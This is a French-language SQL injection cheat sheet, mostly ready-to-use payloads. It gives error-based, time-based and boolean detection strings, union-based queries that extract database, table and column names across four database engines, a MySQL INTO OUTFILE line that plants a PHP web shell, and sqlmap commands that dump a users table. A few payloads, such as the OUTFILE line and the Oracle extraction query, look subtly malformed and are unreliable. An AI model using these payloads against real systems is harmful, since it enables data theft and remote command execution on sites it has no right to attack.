# Cheatsheet : Injection SQL

L'injection SQL est une vulnérabilité de sécurité qui permet à un attaquant d'interférer avec les requêtes qu'une application fait à sa base de données.

## Détection

### Erreurs basées sur les injections
*   Ajouter un guillemet simple `'` à la fin d'un paramètre d'URL ou d'un champ de formulaire. Si une erreur SQL apparaît, c'est un bon signe.
    *   `http://example.com/produit?id=1'`
*   Utiliser des opérateurs logiques pour tester la vulnérabilité :
    *   `' OR 1=1--` (MySQL, PostgreSQL, Oracle)
    *   `" OR 1=1--`
    *   `) OR 1=1--`
    *   `') OR 1=1--`

### Injections aveugles (Blind SQL Injection)
Lorsque les messages d'erreur sont supprimés, on utilise des techniques basées sur le temps ou les booléens.

#### Basé sur le temps (Time-based)
*   MySQL/PostgreSQL : `SLEEP(5)`
    *   `' UNION SELECT SLEEP(5)--`
    *   `' AND SLEEP(5)--`
*   Microsoft SQL Server : `WAITFOR DELAY '0:0:5'`
    *   `' WAITFOR DELAY '0:0:5'--`
*   Oracle : `DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)`
    *   `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--`

#### Basé sur les booléens (Boolean-based)
*   Tester des conditions vraies/fausses pour déduire des informations.
    *   `' AND 1=1--` (devrait retourner le résultat normal)
    *   `' AND 1=2--` (devrait retourner aucun résultat ou une erreur)

## Exploitation

### Union-based SQL Injection
Utilisé pour récupérer des données de la base de données en utilisant l'opérateur `UNION SELECT`.

1.  **Déterminer le nombre de colonnes :**
    *   `' ORDER BY 1--`, `' ORDER BY 2--`, etc., jusqu'à ce qu'une erreur se produise.
    *   `' UNION SELECT NULL, NULL, NULL--` (ajuster le nombre de NULLs)
2.  **Trouver les colonnes affichables :**
    *   `' UNION SELECT 1,2,3--` (remplacer les NULLs par des nombres pour voir quelles colonnes sont affichées)
3.  **Extraire des informations :**
    *   MySQL : `' UNION SELECT 1, database(), user()--`
    *   PostgreSQL : `' UNION SELECT 1, current_database(), current_user--`
    *   Microsoft SQL Server : `' UNION SELECT 1, DB_NAME(), SYSTEM_USER--`
    *   Oracle : `' UNION SELECT 1, SYS.DATABASE_NAME, SYS.USER--`

### Extraction de tables et colonnes

*   **MySQL :**
    *   Tables : `' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()--`
    *   Colonnes : `' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'--`
*   **PostgreSQL :**
    *   Tables : `' UNION SELECT 1, string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema = 'public'--`
    *   Colonnes : `' UNION SELECT 1, string_agg(column_name, ',') FROM information_schema.columns WHERE table_name = 'users'--`
*   **Microsoft SQL Server :**
    *   Tables : `' UNION SELECT 1, name FROM master..sysdatabases--` (pour les bases de données)
    *   Tables : `' UNION SELECT 1, name FROM sysobjects WHERE xtype = 'U'--` (pour les tables de la base de données actuelle)
    *   Colonnes : `' UNION SELECT 1, name FROM syscolumns WHERE id = OBJECT_ID('users')--`

### Écriture de fichiers (File Write)
Si la base de données a les permissions nécessaires (ex: `FILE` privilege en MySQL).

*   MySQL : `' SELECT '<?php system($_GET[\'cmd\']); ?>' INTO OUTFILE '/var/www/html/shell.php'--`

## Outils

*   **SQLMap :** Outil automatisé pour détecter et exploiter les injections SQL.
    *   `sqlmap -u "http://example.com/produit?id=1" --dbs`
    *   `sqlmap -u "http://example.com/produit?id=1" -D database_name -T users --dump`